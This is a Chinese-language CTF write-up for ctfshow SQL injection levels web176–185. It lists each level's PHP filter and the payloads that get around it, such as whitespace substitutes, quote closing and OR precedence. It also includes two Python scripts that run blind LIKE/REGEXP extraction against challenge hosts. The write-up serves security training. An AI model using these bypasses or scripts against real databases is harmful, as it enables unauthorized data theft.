
---
ctfshow

1、web176

过滤方法：出现select，报错

`绕过：大小写绕过`

2、web177~179

过滤方法：过滤 空格，#号

```
绕过方法：用%0a or /**/ 代替空格    %23代替#号
空格被过滤可以用，/**/，%09，%0a，%0b，%0c，%0d还有括号绕过
```

3、web180

过滤方法：过滤%23

```
绕过方法：闭合绕过 or '1'='
注释的方法有三种，-- 和#还有闭合号注释
```


4、web181-182

```mysql

//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";


过滤方法：
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

绕过方法：根据and的优先级大于||或者or，则可以拼接 ` -1'||username='flag ` 从而查询flag出来

5、web183-184
过滤
```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }
```

过滤空格用（）代替，回显只有记录数，可以用like或者regexp进行盲注
LIKE 和 REGEXP之间的重要差别
	LIKE 匹配整个列，如果被匹配的文本在列值中出现，LIKE 将不会找到它，相应的行也不会被返回（除非使用通配符）。而 REGEXP 在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP 将会找到它，相应的行将被返回，并且 REGEXP 能匹配整个列值（与 LIKE 相同的作用）。
```mysql
tableName=(ctfshow_user)where(pass)like('ctfshow%')
看回显
```
脚本-web184-web184对like进行过滤了
```python

import string
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = "https://d03c2933-5349-412c-8351-33438276274f.challenge.ctf.show/select-waf.php"
payload = "ctfshow_user group by pass having pass like 0x{}"
true_flag = "$user_count = 1;"


def make_payload(has: str) -> str:
    return payload.format((has + "%").encode().hex())


def valid_payload(p: str) -> bool:
    data = {
        "tableName": p
    }
    response = requests.post(url, data=data,verify=False)
    return true_flag in response.text


flag = "ctf" # 这里注意表中用 like 'ctf%' 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配
while True:
    for c in "{}-" + string.digits + string.ascii_lowercase:
        pd = flag+c
        print(f"\r[*] trying {pd}", end="")
        if valid_payload(make_payload(pd)):
            flag += c
            print(f"\r[*] flag: {flag}")
            break
    if flag[-1] == "}":
        break

```

web185

```
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }

又对数字过滤，只能用纯字母
```

思路
```
mysql 的cancat()可以连接字符
true=1 false=0
select concat(true+true，false，char(true+...*65))    输出为20c
通过concat来拼接

```
脚本-使用的regexp匹配
```python
import requests
import time
import string

def formatString(str):
    temp="concat("
    for x in str:
        tip=0
        if x in string.digits:
            tmp=int(x)
        else:
            tip=1
            temp+="char("
            tmp=ord(x)
        if tmp == 0:
            temp+="false"
        else:
            temp_d="("
            for i in range(0,tmp):
                temp_d+="true+"
            temp_d=temp_d[:-1]+")"
            if tip==1:
                temp_d+=")"
            temp+=temp_d
        temp+=","
    temp=temp[:-1]+")"
    return temp

#print(formatString("0x63746673686f777b"))

url="http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php"
#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！
dic="ctfshow{qeryuipadgjklzxvbnm0123456789-}_"
flag="ctfshow{"
for i in range(0,40):
    for x in dic:
        data={
            "tableName":"ctfshow_user group by pass having pass regexp({})".format(formatString(flag+x))
        }
        #print(data)
        response=requests.post(url,data=data)
        time.sleep(0.3)
        if response.text.find("$user_count = 1;")>0:
            print("[**] {} is right".format(x))
            flag+=x
            break
        else:
            #print("[--] {} is wrong".format(x))
            continue
    print("[flag]:"+flag)

```